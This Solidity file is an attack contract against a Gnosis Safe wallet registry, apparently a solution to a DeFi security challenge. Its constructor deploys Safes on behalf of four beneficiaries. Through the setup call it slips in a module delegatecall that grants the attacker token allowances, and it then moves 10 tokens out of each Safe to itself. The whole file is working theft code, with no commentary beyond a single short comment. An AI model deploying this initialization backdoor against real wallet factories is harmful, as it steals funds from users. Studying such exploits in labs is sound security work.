// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "./WalletRegistry.sol";
import "hardhat/console.sol";

contract AttackRegistry {
    constructor (address _registry, address _factory, address[4] memory beneficiaries) {
        WalletRegistry registry = WalletRegistry(_registry);
        IERC20 token = registry.token();
        GnosisSafeProxyFactory factory = GnosisSafeProxyFactory(_factory);

        //precompute owners and deploy module
        address[] memory owners = new address[](1);
        Module module = new Module();
        bytes memory moduleCall = abi.encodeWithSelector(Module.approve.selector, token,address(this));
        
        for (uint256 i; i < 4;) {
            owners[0] = beneficiaries[i];
            bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector, owners, 1, address(module), moduleCall, address(0), address(0), 0, address(0));
            GnosisSafeProxy proxy = factory.createProxyWithCallback(registry.masterCopy(), initializer, i, registry);
            token.transferFrom(address(proxy), msg.sender, 10 ether);
            unchecked {
                i++;
            }
        }
    }
}

contract Module {
    function approve(IERC20 token, address owner) public {
        token.approve(owner, 10 ether);
    }
}